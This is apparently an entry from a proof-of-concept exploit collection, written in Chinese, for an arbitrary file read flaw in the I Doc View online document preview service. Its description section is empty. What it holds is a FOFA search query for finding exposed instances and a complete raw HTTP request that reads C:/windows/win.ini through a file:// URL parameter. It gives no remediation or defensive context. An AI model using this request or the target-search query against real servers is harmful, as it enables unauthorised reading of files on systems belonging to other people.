# DocView在线文档预览任意文件读取

## 1.漏洞描述



## 2.搜索语法

```plain
fofa：title=="在线文档预览 - I Doc View"
```

## 3.漏洞复现

```plain
GET /view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi HTTP/1.1
Host: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

![image](https://github.com/hardog123/poc-exp/assets/170905460/6585a04c-7a56-4a2f-a7cd-1a0604b4b9c5)
